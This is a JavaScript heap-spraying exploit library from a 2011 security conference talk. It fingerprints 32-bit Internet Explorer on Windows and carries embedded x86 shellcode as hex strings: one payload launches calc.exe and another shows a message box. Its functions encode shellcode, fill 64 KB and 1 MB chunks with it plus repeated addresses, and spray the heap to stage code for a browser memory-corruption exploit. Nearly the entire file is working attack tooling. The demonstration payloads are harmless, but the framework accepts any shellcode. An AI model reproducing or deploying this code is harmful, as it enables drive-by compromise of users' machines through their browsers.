/**************************************************************************
 * Talk:        Inception - The extended edition
 * Author:      Nelson Brito <nbrito *NoSPAM* prontonmail.com>
 * Conference:  Hackers to Hackers Conference Eighth Edition (October 2011)
 **************************************************************************
 *         .___                            __  .__                        *
 *         |   | ____   ____  ____ _______/  |_|__| ____   ____           *
 *         |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \          *
 *         |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \         *
 *         |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/         *
 *                                 |__|                                   *
 *                     _______________  ____ ____                         *
 *                     \_____  \   _  \/_   /_   |                        *
 *                      /  ____/  /_\  \|   ||   |                        *
 *                     /       \  \_/   \   ||   |                        *
 *                     \________\_______/___||___|                        *
 *                                                                        *
 **************************************************************************
 Copyright (c) 2011 Nelson Brito. All rights reserved worldwide.
 
 This program is free software: you can redistribute it and/or modify it
 under  the terms of the GNU General Public License  as published by the
 Free Software Foundation,  either version 3 of the License, or (at your
 option) any later version.
 
 This program  is  distributed in  the hope that  it will be useful, but
 WITHOUT  ANY  WARRANTY;   without   even  the   implied   warranty   of
 MERCHANTABILITY  or  FITNESS  FOR  A  PARTICULAR  PURPOSE.  See the GNU
 General Public License for more details.
 
 You  should have  received a copy of the  GNU  General  Public  License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
 ***************************************************************************/

/* This JavaScript uses "Single Object Namespacing". */
Exploit.prototype.contructor = function Exploit (){
	if(!(navigator.userAgent.match(/MSIE/)) ||
	   !(navigator.cpuClass.match(/x86/))   ||
	   !(navigator.platform.match(/Win32/))){
		alert("Exploit(): Only compatible with Microsoft Internet Explorer (32-bit)!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	this.code    = new Array(
		// BREAKPOINT = 'ntdll!DbgBreakPoint', SIZE = 20 bytes
		"cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc",
		//  CMD = CALC.EXE, EXITFUNC = process, SIZE = 200 bytes
		"fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b 52 0c 8b 52" +
		"14 8b 72 28 0f b7 4a 26 31 ff 31 c0 ac 3c 61 7c 02 2c 20 c1" +
		"cf 0d 01 c7 e2 f0 52 57 8b 52 10 8b 42 3c 01 d0 8b 40 78 85" +
		"c0 74 4a 01 d0 50 8b 48 18 8b 58 20 01 d3 e3 3c 49 8b 34 8b" +
		"01 d6 31 ff 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b" +
		"7d 24 75 e2 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b" +
		"04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b" +
		"12 eb 86 5d 6a 01 8d 85 b9 00 00 00 50 68 31 8b 6f 87 ff d5" +
		"bb f0 b5 a2 56 68 a6 95 bd 9d ff d5 3c 06 7c 0a 80 fb e0 75" +
		"05 bb 47 13 72 6f 6a 00 53 ff d5 43 41 4c 43 2e 45 58 45 00",
		// ICON = ERROR, TITLE = 'Inception @ H2HC Eighth Edition', SIZE = 422 bytes
		"d9 eb 9b d9 74 24 f4 31 d2 b2 77 31 c9 64 8b 71 30 8b 76 0c" +
		"8b 76 1c 8b 46 08 8b 7e 20 8b 36 38 4f 18 75 f3 59 01 d1 ff" +
		"e1 60 8b 6c 24 24 8b 45 3c 8b 54 28 78 01 ea 8b 4a 18 8b 5a" +
		"20 01 eb e3 34 49 8b 34 8b 01 ee 31 ff 31 c0 fc ac 84 c0 74" +
		"07 c1 cf 0d 01 c7 eb f4 3b 7c 24 28 75 e1 8b 5a 24 01 eb 66" +
		"8b 0c 4b 8b 5a 1c 01 eb 8b 04 8b 01 e8 89 44 24 1c 61 c3 b2" +
		"08 29 d4 89 e5 89 c2 68 8e 4e 0e ec 52 e8 9f ff ff ff 89 45" + 
		"04 bb 7e d8 e2 73 87 1c 24 52 e8 8e ff ff ff 89 45 08 68 6c" +
		"6c 20 41 68 33 32 2e 64 68 75 73 65 72 88 5c 24 0a 89 e6 56" +
		"ff 55 04 89 c2 50 bb a8 a2 4d bc 87 1c 24 52 e8 61 ff ff ff" +
		"68 69 6f 6e 58 68 45 64 69 74 68 68 74 68 20 68 20 45 69 67" +
		"68 48 32 48 43 68 6e 20 40 20 68 70 74 69 6f 68 49 6e 63 65" +
		"31 db 88 5c 24 1f 89 e3 68 21 58 20 20 68 77 69 74 68 68 69" +
		"61 72 20 68 61 6d 69 6c 68 6f 74 20 66 68 72 65 20 6e 68 6f" +
		"75 20 61 68 6b 73 20 79 68 20 6c 69 6e 68 67 20 6f 6e 68 63" +
		"6b 69 6e 68 20 63 6c 69 68 66 6f 72 65 68 65 20 62 65 68 74" +
		"77 69 63 68 69 6e 6b 20 68 6f 20 74 68 68 6e 74 20 74 68 74" +
		"20 77 61 68 6d 69 67 68 68 79 6f 75 20 68 6f 6e 2c 20 68 69" +
		"63 6b 20 68 75 20 63 6c 68 74 20 79 6f 68 20 77 68 61 68 62" +
		"6f 75 74 68 75 6c 20 61 68 61 72 65 66 68 42 65 20 63 31 c9" +
		"88 4c 24 75 89 e1 31 d2 6a 10 53 51 52 ff d0 31 c0 50 ff 55" +
		"08 00"
	);
	this.detail  = new Array();
	this.message = new Boolean(true);
	this.offset  = new Array();
	this.rop     = new Boolean(false);
}

Exploit.prototype.address = function (address, format){
	var addr     = new String(),
	    msb16bit = new Number(),
		lsb16bit = new Number();

	if((typeof address != "number") ||
	   (typeof address == "undefined")){
		alert("this.address(): The \"address\" cannot be \"" + (typeof address) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	msb16bit = (address & 0xffff);
	lsb16bit = ((address >> 16) & 0xffff);

	switch(format){
		case 0:
			addr = addr.concat("%u" + this.hexa(msb16bit, 4) + "%u" + this.hexa(lsb16bit, 4));
			break;
		case 1:
			addr = addr.concat("%u" + this.hexa(lsb16bit, 4) + "%u" + this.hexa(msb16bit, 4));
			break;
		case 2:
			addr = addr.concat("&#x" + this.hexa(msb16bit, 4) + ";" + "&#x" + this.hexa(lsb16bit, 4) + ";");
			break;
		case 3:
			addr = addr.concat("&#x" + this.hexa(lsb16bit, 4) + ";" + "&#x" + this.hexa(msb16bit, 4) + ";");
			break;
		default:
			alert("this.address(): The \"format\" cannot be \"" + format + "\"!");
			CollectGarbage();
			window.location.replace("about:blank");
			break;
	}

	CollectGarbage();

	return(unescape(addr));
}

Exploit.prototype.address2 = function (address, format){
	var strblock = new String(),
	    addr     = new String(),
		padded   = new String(),
		msb16bit = new String(),
		lsb16bit = new String();

	if((typeof address != "number") ||
	   (typeof address == "undefined")){
		alert("this.address2(): The \"address\" cannot be \"" + (typeof address) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	strblock = address.toString(16);

	try{
		for(var i = strblock.length ; i  < 8 ; i++)
			padded = padded.concat("0");

		padded = padded.concat(strblock);

		msb16bit = padded.substr(0, 4);
		lsb16bit = padded.substr(4, 4);
	}catch(error){
		alert("this.address2(): Converting address [" + error.description + "]!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	switch(format){
		case 0:
			addr = addr.concat("%u" + msb16bit + "%u" + lsb16bit);
			break;
		case 1:
			addr = addr.concat("%u" + lsb16bit + "%u" + msb16bit);
			break;
		case 2:
			addr = addr.concat("&#x" + msb16bit + ";" + "&#x" + lsb16bit + ";");
			break;
		case 3:
			addr = addr.concat("&#x" + lsb16bit + ";" + "&#x" + msb16bit + ";");
			break;
		default:
			alert("this.address2(): The \"format\" cannot be \"" + format + "\"!");
			CollectGarbage();
			window.location.replace("about:blank");
			break;
	}

	CollectGarbage();

	return(unescape(addr));
}

Exploit.prototype.ascii = function (method, format, size){
	var ascii    = new String(),
		position = new Number(),
		strblock = new String("!\"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~");

	if((typeof method != "string") ||
	   (typeof method == "undefined")){
		alert("this.ascii(): The \"method\" cannot be \"" + (typeof method) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	if((typeof format != "string") ||
	   (typeof format == "undefined")){
		alert("this.ascii(): The \"format\" cannot be \"" + (typeof format) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	if((typeof size != "number")   ||
	   (typeof size == "undefined")){
		alert("this.ascii(): The \"size\" cannot be \"" + (typeof size) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	if(size <= 0){
		alert("this.ascii(): The \"size\" cannot be \"" + size + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}
 
	switch(format.toLowerCase()){
		case "upper":
			strblock = strblock.slice(strblock.indexOf("A"), strblock.lastIndexOf("Z") + 1);
			break;
		case "lower":
			strblock = strblock.slice(strblock.indexOf("a"), strblock.lastIndexOf("z") + 1);
			break;
		case "mixed":
			strblock = strblock.slice(strblock.indexOf("A"), strblock.lastIndexOf("Z") + 1) +
					   strblock.slice(strblock.indexOf("a"), strblock.lastIndexOf("z") + 1);
			break;
		case "number":
			strblock = strblock.slice(strblock.indexOf("0"), strblock.lastIndexOf("9") + 1);
			break;
		case "ascii":
			break;
		default:
			alert("this.ascii(): The \"format\" cannot be \"" + format.toLowerCase() + "\"!");
			CollectGarbage();
			window.location.replace("about:blank");
			break;
	}

	position = this.random(strblock.length - 1);

	try{
		for(var i = 0 ; i < size ; i++){
			switch(method.toLowerCase()){
				case "mixed":
					position = this.random(strblock.length - 1);
					break;
				case "straight":
					break;
				default:
					alert("this.ascii(): The \"method\" cannot be \"" + method.toLowerCase() + "\"!");
					CollectGarbage();
					window.location.replace("about:blank");
					break;
			}

			ascii = ascii.concat(strblock.charAt(position));
		}

		CollectGarbage();

		return(ascii);
	}catch(error){
		alert("this.ascii(): Creating ASCII [" + error.description + "]!");
		CollectGarbage();
		window.location.replace("about:blank");
	}
}

Exploit.prototype.banner = function (memory){
	var project = new String("Inception @ H2HC Eighth Edition"),
	    module  = new String("Exploit.Lib"),
		version = new String("0.01-Alpha"),
		author  = new String("Nelson Brito"),
		banner  = new Number(),
		message = new String();

	for(var i = 0 ; i < 4 ; i++){
		if((typeof this.detail[i] != "string") ||
		   (typeof this.detail[i] == "undefined"))
			banner++;
	}

	if(banner != 0)
			message = message.concat(
				project + ".\n" + module + " v" + version + " by " + author + ".\n"
			);
	else
		message = message.concat(
			this.detail[0] + " v" + this.detail[1] + "-" + this.detail[2] + " by " + this.detail[3] + ".\n"
		);

	message = message.concat(
		"Spraying " + memory + " MB of arbitrary code in heap memory!"
	);

	CollectGarbage();

	return(message);
}

Exploit.prototype.check = function (address, shellcode, memory){
	if((typeof memory != "number") ||
	   (typeof memory == "undefined")){
		alert("this.check(): The \"memory\" cannot be \"" + (typeof memory) + "\"!");
		CollectGarbage();
		return(false);
	}

	if((memory <= 0) ||
	   (memory > 1024)){
		alert("this.check(): The \"memory\" size cannot be \"" + memory + "\"!");
		CollectGarbage();
		return(false);
	}

	if((typeof address != "string") ||
	   (typeof address == "undefined")){
		alert("this.check(): The \"address\" cannot be \"" + (typeof address) + "\"!");
		CollectGarbage();
		return(false);
	}

	if((address.length <= 0) ||
	  ((address.length * 2) > 4)){
		alert("this.check(): The \"address\" length cannot be \"" + address.length + "\"!");
		CollectGarbage();
		return(false);
	}

	if((typeof shellcode != "string") ||
	   (typeof shellcode == "undefined")){
		alert("this.check(): The \"shellcode\" cannot be \"" + (typeof shellcode) + "\"!");
		CollectGarbage();
		return(false);
	}

	if((shellcode.length <= 0) ||
	  ((shellcode.length * 2) > (128 * 1024))){
		alert("this.check(): The \"shellcode\" length cannot be \"" + (shellcode.length * 2) + "\"!");
		CollectGarbage();
		return(false);
	}

	return(true);
}

Exploit.prototype.chunk1mb = function (block64k){
	var block1mb = new String();

	try{
		for(var i = 0 ; i < 15 ; i++)
			block1mb = block1mb.concat(block64k);

		block1mb = block1mb.concat(block64k.substr(0, (65498 / 2)));

		CollectGarbage();

		return(block1mb);
	}catch(error){
		alert("this.chunk1mb(): Creating 1 MB chunks [" + error.description + "]!");
		CollectGarbage();
		window.location.replace("about:blank");
	}
}

Exploit.prototype.chunk64k = function (address, shellcode){
	var block64k = new String();
	
	try{
		do{
			address = address.concat(address);
		}while((address.length * 2) < 65535);

		block64k = block64k.concat(shellcode);
		block64k = block64k.concat(address.substr(0, (65536 - (shellcode.length * 2)) / 2));

		CollectGarbage();

		return(block64k);
	}catch(error){
		alert("this.chunk64k(): Creating 64 KB chunks [" + error.description + "]!");
		CollectGarbage();
		window.location.replace("about:blank");
	}
}

Exploit.prototype.even = function (shellcode){
	var shellcode = shellcode.replace(/\s*\s*/g,"");

	if(shellcode.length % 2){
		alert("this.even(): The \"shellcode\" length cannot be \"" + (shellcode.length * 2) + "\"!");
		CollectGarbage();
		return(false);
	}

	return(true);
}

Exploit.prototype.heap = function (block1mb, memory){
	var heap = new Array();

	try{
		do{
			heap.push(block1mb.substr(0, block1mb.length));
		}while(heap.length < memory);

		CollectGarbage();

		return(true);
	}catch(error){
		alert("this.heap(): Allocating heap memory [" + error.description + "]!");
		CollectGarbage();
		return(false);
	}
}

Exploit.prototype.hexa = function (address, size){
	var strblock = new String("0123456789abcdef"),
	    hexa     = strblock.substr((address & 0xf), 1), 
		size     = (size ? size : 0);

	try{
		while(address > 0xf){
			address = address >>> 4;
			hexa = strblock.substr((address & 0xf), 1) + hexa;
		}

		while(hexa.length < size)
			hexa = "0" + hexa;

		CollectGarbage();

		return(hexa);
	}catch(error){
		alert("this.hexa(): Converting address [" + error.description + "]!");
		CollectGarbage();
		window.location.replace("about:blank");
	}
}

Exploit.prototype.memory = function (address, align){
	var memory = new Number(),
		align  = new Number();

	if((typeof address != "number") ||
	   (typeof address == "undefined")){
		alert("this.memory(): The \"address\" cannot be \"" + (typeof address) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	switch(typeof size){
		case "number":
			align = parseInt(size);
			break;
		case "string":
			align = parseInt(size.length);
			break;
		case "undefined":
			align = 8;
			break;
		default:
			alert("this.memory(): The \"align\" cannot be \"" + (typeof align) + "\"!");
			CollectGarbage();
			window.location.replace("about:blank");
			break;
	}

	align += ((align % 2) ? (align % 2) : 0);

	memory = parseInt(address / (1024 * 1024));

	if(align > memory){
		alert("this.memory(): The \"align\" cannot be bigger than \"memory\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	CollectGarbage();

	return(memory += ((memory % align) ? (memory % align) : 0));
}

Exploit.prototype.random = function (maximum){
	if((typeof maximum != "number") ||
	   (typeof maximum == "undefined")){
		alert("this.random(): The \"maximum\" cannot be \"" + (typeof maximum) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	if(maximum <= 0){
		alert("this.random(): The \"maximum\" cannot be \"" + maximum + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	CollectGarbage();

	return(Math.floor(Math.random() * maximum));
}

Exploit.prototype.shellcode = function (shellcode, format){
	var regex    = /\s*([0-9A-Fa-f][0-9A-Fa-f])\s*([0-9A-Fa-f][0-9A-Fa-f])/g,
	    code     = new String(),
		msb16bit = new String(),
		lsb16bit = new String();

	if((typeof shellcode != "string") ||
	   (typeof shellcode == "undefined")){
		alert("this.shellcode(): The \"shellcode\" cannot be \"" + (typeof shellcode) + "\"!");
		CollectGarbage();
		window.location.replace("about:blank");
	}

	if(!(this.even(shellcode))){
		CollectGarbage();
		window.location.replace("about:blank");
	}

	try{
		while(regex.exec(shellcode) != null){
			msb16bit = RegExp.$1;
			lsb16bit = RegExp.$2;

			switch(format){
				case 0:
					code = code.concat("%u" + msb16bit + lsb16bit);
					break;
				case 1:
					code = code.concat("%u" + lsb16bit + msb16bit);
					break;
				case 2:
					code = code.concat("&#x" + msb16bit + lsb16bit + ";");
					break;
				case 3:
					code = code.concat("&#x" + lsb16bit + msb16bit + ";");
					break;
				default:
					alert("this.shellcode(): The \"format\" cannot be \"" + format + "\"!");
					CollectGarbage();
					window.location.replace("about:blank");
					break;
			}
		}

		CollectGarbage();

		return(unescape(code));
	}catch(error){
		alert("this.shellcode(): Formating shellcode [" + error.description + "]!");
		CollectGarbage();
		window.location.replace("about:blank");
	}
}

Exploit.prototype.spray = function (address, shellcode, memory){
	var block64k  = new String(),
		block1mb  = new String();

	if(this.check(address, shellcode, memory) == false)
		return(false);

	if(this.message)
		alert(this.banner(memory));

	block64k = block64k.concat(this.chunk64k(address, shellcode));
	block1mb = block1mb.concat(this.chunk1mb(block64k));

	CollectGarbage();

	return(this.heap(block1mb, memory) ? true : false);
}
